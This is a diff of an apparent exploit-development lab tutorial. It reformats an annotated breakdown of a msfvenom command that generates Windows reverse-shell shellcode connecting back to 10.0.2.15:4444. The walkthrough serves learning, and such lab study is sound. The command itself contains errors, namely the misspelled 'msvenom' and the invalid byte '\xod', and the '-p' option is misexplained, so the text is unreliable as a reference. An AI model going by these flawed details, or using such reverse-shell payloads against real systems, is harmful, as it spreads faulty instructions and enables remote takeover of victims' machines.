@@ -104,29 +104,30 @@ So let's create our exploit code, we do this by running:
 `msvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0a\xod"`
 
 So let's break this down:
-  -msvenom Starts the msvenom program
+
+  -*msvenom* Starts the msvenom program
   
-  -p Sets the path to the exploit we want
+  -*-p* Sets the path to the exploit we want
   
-  -windows/shell_reverse_tcp Tells the program we want a reverse shell for Windows
+  -*windows/shell_reverse_tcp* Tells the program we want a reverse shell for Windows
   
-  -LHOST=10.0.2.15 This is our local machine's IP address
+  -*LHOST=10.0.2.15* This is our local machine's IP address
   
-  -LPORT=4444 Sets the port we will be listening on for the reverse shell
+  -*LPORT=4444* Sets the port we will be listening on for the reverse shell
   
-  -EXITFUNC=thread Set the exit function to THREAD so we can interact with the reverse shell
+  -*EXITFUNC=thread* Set the exit function to THREAD so we can interact with the reverse shell
   
-  -f Specify the file type
+  -*-f* Specify the file type
   
-  -c Write the shellcode as a C program
+  -*c* Write the shellcode as a C program
   
-  -a Set the architecture of the victim machine
+  -*-a* Set the architecture of the victim machine
   
-  -x86 Set this as a 32-bit machine for the code
+  -*x86* Set this as a 32-bit machine for the code
   
-  -b Specify bad characters to avoid
+  -*-b* Specify bad characters to avoid
   
-  -"\x00\x0a\xod" These were the bad characters we found.
+  -*"\x00\x0a\xod"* These were the bad characters we found.
   
   
 
